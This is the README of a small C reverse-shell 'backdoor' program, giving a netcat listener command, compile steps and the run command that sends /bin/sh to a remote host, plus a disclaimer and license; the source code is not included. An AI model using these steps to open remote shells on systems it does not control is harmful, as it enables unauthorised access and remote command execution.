## A quick C backdoor ##

This is a simple C backdoor that connects to a remote host (server) and execute /bin/sh on the local host and redirecting it to the remote host, this is often called "reverse shell".

## Usage ##

### Setting up a listener ###

You can use netcat for this purpose:

	nc -l 1500

### Setting up a client ###

Compile the code

	$ cc -o main main.c

run the executable with the required arguments

	$ ./main [RHOST] [RPORT]

then from the listener/remote host, you can run remote commands directly to the shell.

## Issues ##

You have to set a listener before running the code on the local host, and if the connection got disconnected it will not reconnect, but you can get around that with a shell loop.

## DISCLAIMER ##

I am not responsible for any troubles you get in for using this code, It is provided for educational purposes (aka don't screw up).

## Legal ##

Copyright (C) 2016 Ali H. Fardan <raiz@firemail.cc>

Permission to use, copy, modify, and/or distribute this software for any
purpose with or without fee is hereby granted, provided that the above
copyright notice and this permission notice appear in all copies.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE
OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
PERFORMANCE OF THIS SOFTWARE.

